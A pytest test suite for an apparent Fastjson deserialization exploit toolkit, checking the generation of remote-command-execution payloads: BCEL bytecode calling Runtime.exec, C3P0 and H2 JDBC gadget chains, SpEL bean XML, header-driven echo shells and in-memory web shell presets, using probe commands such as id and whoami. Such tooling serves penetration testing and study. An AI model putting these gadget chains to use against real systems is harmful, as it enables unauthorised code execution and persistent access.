"""预设字节码单测（需本机 java + 内置 jars）。"""

from __future__ import annotations

import base64

import pytest

from fastjson_toolkit.poc.bytecode import (
    BytecodePresetOptions,
    build_preset_artifact,
    build_static_payload_source,
    normalize_preset_choice,
    normalize_preset_kind,
    resolve_bytecode_payload,
    resolve_preset_mode,
    wrap_user_bytecode,
)
from fastjson_toolkit.poc.bytecode.encode import (
    bcel_code_from_class_bytes,
    class_bytes_from_bcel_code,
)
from fastjson_toolkit.poc.v1_2_47.service import generate_poc_1247
from fastjson_toolkit.poc import Poc1247GenerateOptions


def test_resolve_preset_mode():
    assert resolve_preset_mode("off", missing_payload=True) is None
    assert resolve_preset_mode("custom", missing_payload=True) is None
    assert resolve_preset_mode("echo", missing_payload=True) is None
    assert resolve_preset_mode("memshell", missing_payload=True) is None
    assert resolve_preset_mode("auto", missing_payload=False) is None
    assert resolve_preset_mode("auto", missing_payload=True) == "exec"
    assert resolve_preset_mode("touch", missing_payload=False) == "touch"
    assert resolve_preset_mode("exec", missing_payload=False) == "exec"


def test_normalize_preset_choice():
    assert normalize_preset_choice("auto") == "auto"
    assert normalize_preset_choice("echo") == "echo"
    assert normalize_preset_choice("memshell") == "memshell"
    assert normalize_preset_choice("off") == "custom"
    assert normalize_preset_choice("custom") == "custom"
    assert normalize_preset_choice("auto", echo=True) == "echo"
    assert normalize_preset_choice("echo", memshell=True) == "memshell"
    assert normalize_preset_choice("exec", echo=True, memshell=True) == "memshell"


def test_normalize_preset_kind_auto_custom():
    assert (
        normalize_preset_kind("auto", missing_user_payload=True) == "exec"
    )
    assert (
        normalize_preset_kind("auto", missing_user_payload=False) == "custom"
    )
    assert normalize_preset_kind("file") is None
    assert normalize_preset_kind("off") == "custom"


def test_static_source_contains_cmd():
    src = build_static_payload_source(mode="exec", cmd="touch /tmp/x")
    assert "touch /tmp/x" in src
    assert "Runtime.getRuntime().exec" in src
    assert "cmd.exe" in src
    assert "/bin/sh" in src


def test_java_os_adaptive_exec_helper():
    from fastjson_toolkit.poc.echo.source import java_os_adaptive_exec

    block = java_os_adaptive_exec('"whoami"', process_var="p", wait_for=True)
    assert "cmd.exe" in block and "/bin/sh" in block
    assert "Process p =" in block
    assert "p.waitFor()" in block


def test_bean_exec_xml_uses_spel_os():
    from fastjson_toolkit.poc.v1_2_80.attack_assets import build_bean_exec_xml

    xml = build_bean_exec_xml("whoami").decode("utf-8")
    assert "cmd.exe" in xml
    assert "/bin/sh" in xml
    assert "#{T(java.lang.System).getProperty" in xml
    assert "whoami" in xml
    assert "<value>/bin/sh</value>" not in xml


def test_build_preset_artifact_exec():
    art = build_preset_artifact(
        mode="exec",
        cmd="id",
        proof_path="/tmp/fj1247_test",
        proof_content="TEST",
    )
    assert art.class_bytes.startswith(b"\xca\xfe\xba\xbe")
    assert art.bcel_code.startswith("$$BCEL$$")
    assert base64.b64decode(art.class_b64) == art.class_bytes
    assert "Runtime.getRuntime().exec" in art.source
    assert "/tmp/fj1247_test" in art.source


def test_build_preset_artifact_c3p0():
    art = build_preset_artifact(
        mode="touch",
        proof_path="/tmp/fj1247_c3p0",
        proof_content="C3P0",
        for_c3p0=True,
    )
    assert art.serialized_b64
    raw = base64.b64decode(art.serialized_b64)
    assert raw.startswith(b"\xac\xed\x00\x05")
    assert "readObject" in art.source


def test_wrap_user_bytecode_derives_bcel():
    art0 = build_preset_artifact(mode="exec", cmd="id", proof_path="/tmp/x")
    wrapped = wrap_user_bytecode(
        BytecodePresetOptions(
            preset="custom",
            class_b64=art0.class_b64,
            class_name=art0.class_name,
        )
    )
    assert wrapped.kind == "custom"
    assert wrapped.bcel_code.startswith("$$BCEL$$")
    roundtrip = class_bytes_from_bcel_code(wrapped.bcel_code)
    assert roundtrip.startswith(b"\xca\xfe\xba\xbe")


def test_resolve_bytecode_payload_exec():
    art = resolve_bytecode_payload(
        BytecodePresetOptions(
            preset="exec",
            cmd="id",
            proof_path="/tmp/fj_resolve",
            proof_content="R",
        )
    )
    assert art is not None
    assert art.kind == "exec"
    assert art.class_bytes.startswith(b"\xca\xfe\xba\xbe")


def test_resolve_bytecode_payload_echo():
    art = resolve_bytecode_payload(
        BytecodePresetOptions(
            preset="echo",
            engine="tomcat",
            cmd_header="X-Cmd",
        )
    )
    assert art is not None
    assert art.kind == "echo"
    assert art.class_b64
    assert art.bcel_code.startswith("$$BCEL$$")


def test_generate_1247_bcel_without_user_bytecode():
    r = generate_poc_1247(
        Poc1247GenerateOptions(
            gadget="bcel_tomcat_dbcp2",
            preset="exec",
            cmd="id",
        )
    )
    assert r.ok
    assert r.preset == "exec"
    assert r.bcel_code and r.bcel_code.startswith("$$BCEL$$")
    assert r.class_b64
    assert "$$BCEL$$" in r.payload


def test_generate_1247_preset_custom_requires_bytecode():
    with pytest.raises(ValueError, match="class_b64|bcel_code|BCEL"):
        generate_poc_1247(
            Poc1247GenerateOptions(
                gadget="bcel_tomcat_dbcp2",
                preset="custom",
            )
        )


def test_generate_1247_preset_off_alias_custom():
    with pytest.raises(ValueError, match="class_b64|bcel_code|BCEL"):
        generate_poc_1247(
            Poc1247GenerateOptions(
                gadget="bcel_tomcat_dbcp2",
                preset="off",
            )
        )


def test_generate_1247_h2_preset_touch():
    r = generate_poc_1247(
        Poc1247GenerateOptions(
            gadget="h2_jdbc",
            preset="touch",
            proof_path="/tmp/fj1247_h2",
        )
    )
    assert r.ok
    assert r.preset == "touch"
    assert r.class_b64
    assert "jdbc:h2:mem:" in r.payload


def test_generate_1247_c3p0_preset():
    r = generate_poc_1247(
        Poc1247GenerateOptions(
            gadget="c3p0_wrapper",
            preset="exec",
            cmd="id",
        )
    )
    assert r.ok
    assert r.preset == "exec"
    assert "HexAsciiSerializedMap:" in r.payload


def test_generate_1247_preset_echo():
    r = generate_poc_1247(
        Poc1247GenerateOptions(
            gadget="bcel_tomcat_dbcp2",
            preset="echo",
            engine="tomcat",
            cmd="id",
        )
    )
    assert r.ok
    assert r.preset == "echo"
    assert r.echo is True
    assert r.bcel_code and r.bcel_code.startswith("$$BCEL$$")
    assert r.class_b64


def test_generate_1247_legacy_echo_flag():
    r = generate_poc_1247(
        Poc1247GenerateOptions(
            gadget="h2_jdbc",
            preset="auto",
            echo=True,
            cmd="whoami",
        )
    )
    assert r.ok
    assert r.preset == "echo"
    assert r.echo is True
    assert r.class_b64
    assert "jdbc:h2:mem:" in r.payload


def test_generate_1247_custom_with_class_b64():
    base = build_preset_artifact(mode="exec", cmd="id", proof_path="/tmp/c")
    r = generate_poc_1247(
        Poc1247GenerateOptions(
            gadget="bcel_tomcat_dbcp2",
            preset="custom",
            class_b64=base.class_b64,
        )
    )
    assert r.ok
    assert r.preset == "custom"
    assert r.bcel_code and r.bcel_code.startswith("$$BCEL$$")
    # 用户 class 与派生 BCEL 互转一致
    assert class_bytes_from_bcel_code(r.bcel_code).startswith(b"\xca\xfe\xba\xbe")
